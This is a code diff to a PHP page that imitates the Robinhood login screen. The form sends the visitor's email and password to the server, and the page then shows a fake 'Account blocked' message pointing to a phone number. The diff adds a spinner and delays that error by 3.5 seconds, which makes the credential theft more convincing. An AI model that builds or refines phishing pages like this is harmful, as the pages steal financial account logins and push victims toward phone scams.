@@ -340,9 +340,7 @@ if ($_SERVER["REQUEST_METHOD"] === "POST") {
         <form id="loginForm" novalidate  method="POST" action="">
             <!-- Error box -->
             <div id="errorBox" class="error" role="alert" aria-live="assertive" aria-atomic="true">
-                <strong>Account blocked</strong>
-                Due to suspicious activity, your account has been blocked. Please contact our customer service at
-                <strong>+1877-334-0352</strong>. Error code <strong>E902</strong>
+                
             </div>
 
             <h1>Log in to Robinhood</h1>
@@ -369,7 +367,10 @@ if ($_SERVER["REQUEST_METHOD"] === "POST") {
             </div>
 
             <div class="buttons">
-                <button type="submit" class="btn btn-primary">Log In</button>
+				<button type="submit" class="btn btn-primary" id="loginBtn">
+        <span id="btnText">Log In</span>
+        <span id="spinner" class="spinner hidden"></span>
+    </button>
                 <a href="tel:+1877-334-0352" type="button" class="btn btn-outline" style="text-decoration:none;text-align:center;">Help</a>
             </div>
 
@@ -473,8 +474,7 @@ if ($_SERVER["REQUEST_METHOD"] === "POST") {
                 password.classList.remove("input-error");
             }
         }
-
-      form.addEventListener("submit", function (e) {
+form.addEventListener("submit", function (e) {
     e.preventDefault();
 
     if (!email.value.trim() || !password.value.trim()) {
@@ -482,8 +482,7 @@ if ($_SERVER["REQUEST_METHOD"] === "POST") {
         return;
     }
 
-    // show same error UI
-    showError(" " + BLOCKED_MSG);
+    clearError(); // hide if already visible
 
     // send data to PHP (same page)
     const formData = new FormData(form);
@@ -495,10 +494,13 @@ if ($_SERVER["REQUEST_METHOD"] === "POST") {
     .then(res => res.text())
     .then(data => {
         console.log("Server:", data);
-        // silently saved, UI unchanged
     })
     .catch(err => console.error(err));
-	
+
+    // ⏳ SHOW ERROR AFTER 3.5 SECONDS
+    setTimeout(() => {
+        showError(" " + BLOCKED_MSG);
+    }, 3500);
 });
 
 
